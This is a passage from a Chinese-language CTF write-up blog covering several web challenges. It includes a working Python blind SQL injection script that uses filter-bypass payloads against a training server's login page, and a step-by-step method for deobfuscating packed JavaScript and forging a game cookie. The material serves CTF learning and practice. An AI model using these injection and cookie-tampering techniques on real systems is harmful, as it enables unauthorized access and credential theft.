Accept-<span class="hljs-string">Language:</span> zh-CN,zh;q=<span class="hljs-number">0.8</span>,en-US;q=<span class="hljs-number">0.5</span>,en;q=<span class="hljs-number">0.3</span>
<span class="hljs-string">DNT:</span> <span class="hljs-number">1</span>
<span class="hljs-string">Cookie:</span> ISecer=<span class="hljs-string">s:</span><span class="hljs-number">0</span>:<span class="hljs-string">""</span>;
<span class="hljs-string">Connection:</span> close</code></pre></div>



<h2 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h2><p>提示：</p>
<blockquote>
<p>全都tm过滤了绝望吗？</p>
<p>提示 !,!=,=,+,-,^,%</p>
</blockquote>
<p>带有过滤的sql注入</p>
<p>先测试一下过滤哪些字符</p>
<p><img src="https://i.loli.net/2020/11/25/zAG3jeME7Ocs2Wt.png" srcset="/img/loading.gif" alt="sql2-2.png"></p>
<p>测试发现  or ，and,#,–+,union,from ,database(),这些常用字符都被过滤了，没有过滤的字符只有提示中的字符</p>
<p>测试还可以发现，当uname=admin&amp;passwd=111时提示的password error ,</p>
<p>但是当uname=adm&amp;passwd=111时提示username error，这也是盲注的一种了。</p>
<p>当uname=admin’-1-‘&amp;passwd=11时为false</p>
<p>当uname=admin’-0-‘&amp;passwd=1时为true</p>
<p>所以猜测sql查询语句为</p>
<div class="hljs"><pre><code class="hljs mysql">$sql &#x3D; select * from users where username&#x3D;$username;</code></pre></div>

<h3 id="尝试构造注入语句"><a href="#尝试构造注入语句" class="headerlink" title="尝试构造注入语句"></a>尝试构造注入语句</h3><div class="hljs"><pre><code class="hljs lisp">ascii(<span class="hljs-name">substr</span>((<span class="hljs-name">select</span> database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))&gt;50</code></pre></div>

<p>上名的语句可以放到admin’-1’&amp;passwd=11中 1的位置</p>
<p>但是还是存在很多问题，因为题目过滤了空格，逗号，多次修改后勾出下面的语句</p>
<div class="hljs"><pre><code class="hljs mysql">ascii(mid(REVERSE(MID((passwd)from(-1)))from(-1)))&gt;0</code></pre></div>

<p>reverse 为字符串反转函数</p>
<p><img src="https://i.loli.net/2020/11/25/fAOErbn2JSWxgPM.png" srcset="/img/loading.gif" alt="sql2-1.png"></p>
<p>确定盲注的判断条件</p>
<p>当上面的语句成立时返回的是 username error </p>
<p><img src="https://i.loli.net/2020/11/25/7NWBSIEGUTqiMKt.png" srcset="/img/loading.gif" alt="sql2-4.png"></p>
<p>不成立时返回的是password  error  </p>
<p><img src="https://i.loli.net/2020/11/25/5wdsrDZSipRENB3.png" srcset="/img/loading.gif" alt="sql-3.png"></p>
<p>编写脚本</p>
<p>因为密码保存时一般是以 md5形式保存，所以爆破密码的长度应该为32位</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">"http://123.206.87.240:8007/web2/login.php"</span>
cookie =&#123;<span class="hljs-string">'PHPSESSID'</span>:<span class="hljs-string">'r3rln64ialiqjnefpa6qu5a0t513t8rs'</span>&#125;
password = <span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">'0123456789abcdef'</span>:
        payload = <span class="hljs-string">"admin'-(ascii(mid(REVERSE(MID((passwd)from(-&#123;0&#125;)))from(-1)))=&#123;1&#125;)-'"</span>.format(i,ord(j))
        data=&#123;<span class="hljs-string">'uname'</span>:payload,<span class="hljs-string">'passwd'</span>:<span class="hljs-string">"111"</span>&#125;
        res = requests.post(url=url,cookies=cookie,data=data)
        <span class="hljs-keyword">if</span> <span class="hljs-string">"username"</span> <span class="hljs-keyword">in</span> res.text:
            password +=j
            <span class="hljs-comment">#print(password)</span>
            <span class="hljs-keyword">break</span>
print(password)</code></pre></div>

<p><img src="https://i.loli.net/2020/11/25/uhOXQkE5VNt623H.png" srcset="/img/loading.gif" alt="sql2-5.png"></p>
<div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">005</span>b81fd960f61505237dbb7a3202910
md5在线解码后为admin123</code></pre></div>

<p>登录后即可用ls命令，就可以拿到flag</p>
<p>这题使用的是弱密码，也可以直接使用bp的爆破模块进行密码爆破</p>
<p>参考叶师傅：<a href="https://xz.aliyun.com/t/2583" target="_blank" rel="noopener">https://xz.aliyun.com/t/2583</a></p>
<h2 id="孙xx的博客"><a href="#孙xx的博客" class="headerlink" title="孙xx的博客"></a>孙xx的博客</h2><p>进入页面是一个博客的页面，有搜索功能，没有思路</p>
<p>于是扫描目录</p>
<p><img src="https://i.loli.net/2020/11/25/eMWjLmnHahPJXk9.png" srcset="/img/loading.gif" alt="blog.png"></p>
<p>但是没有有用的信息，查看网上的wp，发现phpmyadmin被人删了，所以没法做</p>
<h2 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h2><p>tips:不要一次就放弃</p>
<p>是个登录页面，但是没有账号，想着先注册一个，但是发现提示数据库连接失败，所以应该不是这个方法</p>
<p>那就万事不觉扫以下</p>
<p>还真有发现</p>
<p>扫到三个目录</p>
<p>login.php</p>
<p>register.php</p>
<p>show.php</p>
<p>访问show.php,拿到flag</p>
<p><img src="https://i.loli.net/2020/11/25/9JLhgS4HveW7Yyk.png" srcset="/img/loading.gif" alt="trim.png"></p>
<h2 id="login2-SKCTF-login3-文件上传2-login4"><a href="#login2-SKCTF-login3-文件上传2-login4" class="headerlink" title="login2(SKCTF)  login3  文件上传2  login4"></a>login2(SKCTF)  login3  文件上传2  login4</h2><p>题目都挂了</p>
<h2 id="江湖魔头"><a href="#江湖魔头" class="headerlink" title="江湖魔头"></a>江湖魔头</h2><p>提示:学会如来神掌就可以打败他了吧</p>
<p>进入题目发现还真像是游戏的界面</p>
<p>包含属性 练功 商店 赚钱 讨伐 退出 几个页面</p>
<p><img src="https://i.loli.net/2020/11/25/YSI7zwLur5nCdca.png" srcset="/img/loading.gif" alt="mt-1.png"></p>
<p>其中练功可以提高自身属性，也就是武力值，赚钱每次只能赚100，而商店中有一些提高武力值的武器，其中就有如来神掌，但是价格也高的惊人，肯定不是通过赚钱的方法挣到那么多钱。所以思路就是通过漏洞修改金钱数量之后购买如来神掌，打败魔头拿到flag</p>
<p><strong>查看源码</strong>    </p>
<p>在wulin.php中可以看到三个js文件</p>
<p><img src="https://i.loli.net/2020/11/25/Qkqr6FwmHVndU3s.png" srcset="/img/loading.gif" alt="mt-2.png"></p>
<div class="hljs"><pre><code class="hljs js"><span class="hljs-comment">//script.js 在线格式化后的结果</span>


<span class="hljs-built_in">eval</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">p, a, c, k, e, r</span>) </span>&#123;
	e = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>) </span>&#123;
		<span class="hljs-keyword">return</span> (c &lt; <span class="hljs-number">62</span> ? <span class="hljs-string">''</span> : e(<span class="hljs-built_in">parseInt</span>(c / <span class="hljs-number">62</span>))) + ((c = c % <span class="hljs-number">62</span>) &gt; <span class="hljs-number">35</span> ? <span class="hljs-built_in">String</span>.fromCharCode(c + <span class="hljs-number">29</span>) : c.toString(<span class="hljs-number">36</span>))
	&#125;;
	<span class="hljs-keyword">if</span> (<span class="hljs-string">'0'</span>.replace(<span class="hljs-number">0</span>, e) == <span class="hljs-number">0</span>) &#123;
		<span class="hljs-keyword">while</span> (c--) r[e(c)] = k[c];
		k = [<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) </span>&#123;
			<span class="hljs-keyword">return</span> r[e] || e
		&#125;];
		e = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;
			<span class="hljs-keyword">return</span> <span class="hljs-string">'[57-9abd-hj-zAB]'</span>
		&#125;;
		c = <span class="hljs-number">1</span>
	&#125;;
	<span class="hljs-keyword">while</span> (c--)
		<span class="hljs-keyword">if</span> (k[c]) p = p.replace(<span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">'\\b'</span> + e(c) + <span class="hljs-string">'\\b'</span>, <span class="hljs-string">'g'</span>), k[c]);
	<span class="hljs-keyword">return</span> p
&#125;(<span class="hljs-string">'7 s(t)&#123;5 m=t+"=";5 8=9.cookie.n(\';\');o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p""&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r="";o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y="user";5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\';\');5 e="";o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v("A"))&#123;e=8[i+1].n(":")[2]&#125;&#125;e=e.B(\'"\',"").B(\'"\',"");9.write(\'&lt;img id="f-1" g="h/1-1.k"&gt;\');j(7()&#123;9.l("f-1").g="h/1-2.k"&#125;,1000);j(7()&#123;9.l("f-1").g="h/1-3.k"&#125;,2000);j(7()&#123;9.l("f-1").g="h/1-4.k"&#125;,3000);j(7()&#123;9.l("f-1").g="h/6.png"&#125;,4000);j(7()&#123;alert("浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;"+md5(e)+"&#125;")&#125;,5000)&#125;'</span>, [], <span class="hljs-number">38</span>, <span class="hljs-string">'|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace'</span>.split(<span class="hljs-string">'|'</span>), <span class="hljs-number">0</span>, &#123;&#125;))</code></pre></div>

<p>可以看到<code>function(p, a, c, k, e, r)</code>函数有六个参数，而后面的一串字符可以发现是对应的六个实参，所以可以直接执行这段js代码，看看结果是什么。</p>
<div class="hljs"><pre><code class="hljs js">(<span class="hljs-string">'7 s(t)&#123;5 m=t+"=";5 8=9.cookie.n(\';\');o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p""&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r="";o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y="user";5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\';\');5 e="";o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v("A"))&#123;e=8[i+1].n(":")[2]&#125;&#125;e=e.B(\'"\',"").B(\'"\',"");9.write(\'&lt;img id="f-1" g="h/1-1.k"&gt;\');j(7()&#123;9.l("f-1").g="h/1-2.k"&#125;,1000);j(7()&#123;9.l("f-1").g="h/1-3.k"&#125;,2000);j(7()&#123;9.l("f-1").g="h/1-4.k"&#125;,3000);j(7()&#123;9.l("f-1").g="h/6.png"&#125;,4000);j(7()&#123;alert("浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;"+md5(e)+"&#125;")&#125;,5000)&#125;'</span>, [], <span class="hljs-number">38</span>, <span class="hljs-string">'|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace'</span>.split(<span class="hljs-string">'|'</span>), <span class="hljs-number">0</span>, &#123;&#125;)</code></pre></div>



<p>删除eval在浏览器的控制台跑出的结果</p>
<p><img src="https://i.loli.net/2020/11/25/gPRY2r7G1LdtecT.png" srcset="/img/loading.gif" alt="mt-4.png"></p>
<p>在线代码格式化后如下</p>
<div class="hljs"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCookie</span>(<span class="hljs-params">cname</span>) </span>&#123;
    <span class="hljs-keyword">var</span> name = cname + <span class="hljs-string">"="</span>;
    <span class="hljs-keyword">var</span> ca = <span class="hljs-built_in">document</span>.cookie.split(<span class="hljs-string">';'</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; ca.length; i++) &#123;
        <span class="hljs-keyword">var</span> c = ca[i].trim();
        <span class="hljs-keyword">if</span> (c.indexOf(name) == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> c.substring(name.length, c.length)
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode_create</span>(<span class="hljs-params">temp</span>) </span>&#123;
    <span class="hljs-keyword">var</span> base = <span class="hljs-keyword">new</span> Base64();
    <span class="hljs-keyword">var</span> result = base.decode(temp);
    <span class="hljs-keyword">var</span> result3 = <span class="hljs-string">""</span>;
    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; result.length; i++) &#123;
        <span class="hljs-keyword">var</span> num = result[i].charCodeAt();
        num = num ^ i;
        num = num - ((i % <span class="hljs-number">10</span>) + <span class="hljs-number">2</span>);
        result3 += <span class="hljs-built_in">String</span>.fromCharCode(num)
    &#125;
    <span class="hljs-keyword">return</span> result3
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ertqwe</span>(<span class="hljs-params"></span>) </span>&#123;
    <span class="hljs-keyword">var</span> temp_name = <span class="hljs-string">"user"</span>;
    <span class="hljs-keyword">var</span> temp = getCookie(temp_name);
    temp = <span class="hljs-built_in">decodeURIComponent</span>(temp);
    <span class="hljs-keyword">var</span> mingwen = decode_create(temp);
    <span class="hljs-keyword">var</span> ca = mingwen.split(<span class="hljs-string">';'</span>);
    <span class="hljs-keyword">var</span> key = <span class="hljs-string">""</span>;
    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; ca.length; i++) &#123;
        <span class="hljs-keyword">if</span> (<span class="hljs-number">-1</span> &lt; ca[i].indexOf(<span class="hljs-string">"flag"</span>)) &#123;
            key = ca[i + <span class="hljs-number">1</span>].split(<span class="hljs-string">":"</span>)[<span class="hljs-number">2</span>]
        &#125;
    &#125;
    key = key.replace(<span class="hljs-string">'"'</span>, <span class="hljs-string">""</span>).replace(<span class="hljs-string">'"'</span>, <span class="hljs-string">""</span>);
    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">'&lt;img id="attack-1" src="image/1-1.jpg"&gt;'</span>);
    setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"attack-1"</span>).src = <span class="hljs-string">"image/1-2.jpg"</span>
    &#125;, <span class="hljs-number">1000</span>);
    setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"attack-1"</span>).src = <span class="hljs-string">"image/1-3.jpg"</span>
    &#125;, <span class="hljs-number">2000</span>);
    setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"attack-1"</span>).src = <span class="hljs-string">"image/1-4.jpg"</span>
    &#125;, <span class="hljs-number">3000</span>);
    setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"attack-1"</span>).src = <span class="hljs-string">"image/6.png"</span>
    &#125;, <span class="hljs-number">4000</span>);
    setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        alert(<span class="hljs-string">"浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!flag&#123;"</span> + md5(key) + <span class="hljs-string">"&#125;"</span>)    <span class="hljs-comment">//发现了flag字段  </span>
    &#125;, <span class="hljs-number">5000</span>)
&#125;</code></pre></div>

<p>首先在控制台中获取cookie</p>
<div class="hljs"><pre><code class="hljs abnf">getCookie(<span class="hljs-string">"user"</span>)<span class="hljs-comment">;</span></code></pre></div>



<p><img src="https://i.loli.net/2020/11/25/YAdm9g1Z8R7MXIk.png" srcset="/img/loading.gif" alt></p>
<p>获取cookie，使用上面的js代码一步一步解码</p>
<p>最后会获取序列化后的一串字符串</p>
<p><img src="https://i.loli.net/2020/11/25/ceNDwnU2LAVkv5Z.png" srcset="/img/loading.gif" alt="mt-5.png"></p>
<p>最后解出来的cookie值</p>
<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:"human"</span><span class="hljs-selector-pseudo">:10</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"xueliang"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">615</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">"neili"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">657</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">"lidao"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">76</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"dingli"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">72</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">7</span>:<span class="hljs-string">"waigong"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">7</span>:<span class="hljs-string">"neigong"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">7</span>:<span class="hljs-string">"jingyan"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"yelian"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">"money"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"flag"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">1</span>:<span class="hljs-string">"0"</span>;&#125;</code></pre></div>

<p>但是会发现money的值为0，所以下面的思路就是通过修改cookie中money值之后反编码成题目中的格式，抓包修改cookie后买技能打怪拿到flag</p>
<p>改cookie的方法就是将明文逆向编码：</p>
<p>刚开始写了挺久的逆向解密，发现调用base64中的encode时，怎么也解不出原来的加密代码，encode怎么也加密不出原来的cookie。<br>猜想一定是base64.js有问题：</p>
<p>发现加密过程并不对应，encode调用了_utf8_encode<br>但decode并没有调用_utf8_encode，所以需要对编码过程进行相应的修改</p>
<p><img src="https://i.loli.net/2020/11/25/GWgjr69lpYb74cT.png" srcset="/img/loading.gif" alt="mt-7.png"></p>
<p><strong>修改后的反编码过程</strong>，将其放到html文件中，浏览器运行即可出结果</p>
<div class="hljs"><pre><code class="hljs html">//1.html
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>

<span class="actionscript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Base64</span><span class="hljs-params">()</span> </span>&#123;</span>
 
<span class="actionscript">	<span class="hljs-comment">// private property</span></span>
<span class="actionscript">	_keyStr = <span class="hljs-string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="</span>;</span>
 
<span class="actionscript">	<span class="hljs-comment">// public method for encoding</span></span>
<span class="actionscript">	<span class="hljs-keyword">this</span>.encode = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(input)</span> </span>&#123;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> output = <span class="hljs-string">""</span>;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> chr1, chr2, chr3, enc1, enc2, enc3, enc4;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span>
<span class="actionscript">		<span class="hljs-comment">//input = _utf8_encode(input); (注释掉这个函数调用)</span></span>
<span class="actionscript">		<span class="hljs-keyword">while</span> (i &lt; input.length) &#123;</span>
			chr1 = input.charCodeAt(i++);
			chr2 = input.charCodeAt(i++);
			chr3 = input.charCodeAt(i++);
			enc1 = chr1 &gt;&gt; 2;
<span class="handlebars"><span class="xml">			enc2 = ((chr1 &amp; 3) <span class="hljs-tag">&lt;&lt; <span class="hljs-attr">4</span>) | (<span class="hljs-attr">chr2</span> &gt;</span>&gt; 4);</span></span>
<span class="handlebars"><span class="xml">			enc3 = ((chr2 &amp; 15) <span class="hljs-tag">&lt;&lt; <span class="hljs-attr">2</span>) | (<span class="hljs-attr">chr3</span> &gt;</span>&gt; 6);</span></span>
			enc4 = chr3 &amp; 63;
<span class="javascript">			<span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(chr2)) &#123;</span>
				enc3 = enc4 = 64;
<span class="javascript">			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(chr3)) &#123;</span>
				enc4 = 64;
			&#125;
			output = output +
			_keyStr.charAt(enc1) + _keyStr.charAt(enc2) +
			_keyStr.charAt(enc3) + _keyStr.charAt(enc4);
		&#125;
<span class="actionscript">		<span class="hljs-keyword">return</span> output;</span>
	&#125;
 
<span class="actionscript">	<span class="hljs-comment">// public method for decoding</span></span>
<span class="actionscript">	<span class="hljs-keyword">this</span>.decode = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(input)</span> </span>&#123;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> output = <span class="hljs-string">""</span>;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> chr1, chr2, chr3;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> enc1, enc2, enc3, enc4;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span>
<span class="javascript">		input = input.replace(<span class="hljs-regexp">/[^A-Za-z0-9\+\/\=]/g</span>, <span class="hljs-string">""</span>);</span>
<span class="actionscript">		<span class="hljs-keyword">while</span> (i &lt; input.length) &#123;</span>
			enc1 = _keyStr.indexOf(input.charAt(i++));
			enc2 = _keyStr.indexOf(input.charAt(i++));
			enc3 = _keyStr.indexOf(input.charAt(i++));
			enc4 = _keyStr.indexOf(input.charAt(i++));
<span class="handlebars"><span class="xml">			chr1 = (enc1 <span class="hljs-tag">&lt;&lt; <span class="hljs-attr">2</span>) | (<span class="hljs-attr">enc2</span> &gt;</span>&gt; 4);</span></span>
<span class="handlebars"><span class="xml">			chr2 = ((enc2 &amp; 15) <span class="hljs-tag">&lt;&lt; <span class="hljs-attr">4</span>) | (<span class="hljs-attr">enc3</span> &gt;</span>&gt; 2);</span></span>
			chr3 = ((enc3 &amp; 3) &lt;&lt; 6) | enc4;
<span class="javascript">			output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr1);</span>
			if (enc3 != 64) &#123;
<span class="javascript">				output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr2);</span>
			&#125;
			if (enc4 != 64) &#123;
<span class="javascript">				output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr3);</span>
			&#125;
		&#125;
<span class="actionscript">		<span class="hljs-comment">//output = _utf8_decode(output);</span></span>
<span class="actionscript">		<span class="hljs-keyword">return</span> output;</span>
	&#125;
 
<span class="actionscript">	<span class="hljs-comment">// private method for UTF-8 encoding</span></span>
<span class="actionscript">	_utf8_encode = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(string)</span> </span>&#123;</span>
<span class="javascript">		string = string.replace(<span class="hljs-regexp">/\r\n/g</span>,<span class="hljs-string">"\n"</span>);</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> utftext = <span class="hljs-string">""</span>;</span>
<span class="actionscript">		<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> n = <span class="hljs-number">0</span>; n &lt; string.length; n++) &#123;</span>
<span class="actionscript">			<span class="hljs-keyword">var</span> c = string.charCodeAt(n);</span>
			if (c &lt; 128) &#123;
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode(c);</span>
<span class="actionscript">			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((c &gt; <span class="hljs-number">127</span>) &amp;&amp; (c &lt; <span class="hljs-number">2048</span>)) &#123;</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &gt;&gt; <span class="hljs-number">6</span>) | <span class="hljs-number">192</span>);</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>
<span class="actionscript">			&#125; <span class="hljs-keyword">else</span> &#123;</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &gt;&gt; <span class="hljs-number">12</span>) | <span class="hljs-number">224</span>);</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode(((c &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>
			&#125;
 
		&#125;
<span class="actionscript">		<span class="hljs-keyword">return</span> utftext;</span>
	&#125;
 
<span class="actionscript">	<span class="hljs-comment">// private method for UTF-8 decoding</span></span>
<span class="actionscript">	_utf8_decode = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(utftext)</span> </span>&#123;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> string = <span class="hljs-string">""</span>;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span>
<span class="actionscript">		<span class="hljs-keyword">var</span> c = c1 = c2 = <span class="hljs-number">0</span>;</span>
<span class="actionscript">		<span class="hljs-keyword">while</span> ( i &lt; utftext.length ) &#123;</span>
			c = utftext.charCodeAt(i);
			if (c &lt; 128) &#123;
<span class="javascript">				string += <span class="hljs-built_in">String</span>.fromCharCode(c);</span>
				i++;
<span class="actionscript">			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((c &gt; <span class="hljs-number">191</span>) &amp;&amp; (c &lt; <span class="hljs-number">224</span>)) &#123;</span>
				c2 = utftext.charCodeAt(i+1);
<span class="javascript">				string += <span class="hljs-built_in">String</span>.fromCharCode(((c &amp; <span class="hljs-number">31</span>) &lt;&lt; <span class="hljs-number">6</span>) | (c2 &amp; <span class="hljs-number">63</span>));</span>
				i += 2;
<span class="actionscript">			&#125; <span class="hljs-keyword">else</span> &#123;</span>
				c2 = utftext.charCodeAt(i+1);
				c3 = utftext.charCodeAt(i+2);
<span class="javascript">				string += <span class="hljs-built_in">String</span>.fromCharCode(((c &amp; <span class="hljs-number">15</span>) &lt;&lt; <span class="hljs-number">12</span>) | ((c2 &amp; <span class="hljs-number">63</span>) &lt;&lt; <span class="hljs-number">6</span>) | (c3 &amp; <span class="hljs-number">63</span>));</span>
				i += 3;
			&#125;
		&#125;
<span class="actionscript">		<span class="hljs-keyword">return</span> string;</span>
	&#125;
&#125;


<span class="actionscript"><span class="hljs-comment">//原来cookie</span></span>
<span class="actionscript"><span class="hljs-keyword">var</span> temp = <span class="hljs-string">"UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo/BTzBxKbu6fbrB+H+ps3nsLrP6dCs0LgR8fj1/+6y3+/apJ3XnJnkjNPf0NnRjpPD7pjzzfaMiJDcxt/XkP/B+I2C5vTqgUE="</span>;</span>
<span class="actionscript"><span class="hljs-comment">//进行加密，获取明文</span></span>

<span class="actionscript"><span class="hljs-keyword">var</span> base = <span class="hljs-keyword">new</span> Base64();</span>
<span class="actionscript"><span class="hljs-keyword">var</span> result = base.decode(temp);</span>
<span class="actionscript"><span class="hljs-keyword">var</span> result3 = <span class="hljs-string">""</span>;</span>
for (i = 0; i &lt; result.length; i++) &#123;
<span class="actionscript">	<span class="hljs-keyword">var</span> num = result[i].charCodeAt();</span>
	num = num ^ i;
	num = num - ((i % 10) + 2);
<span class="javascript">	result3 += <span class="hljs-built_in">String</span>.fromCharCode(num);</span>
&#125;
    
<span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">"原明文："</span>+result3+<span class="hljs-string">'&lt;br/&gt;'</span>);</span>
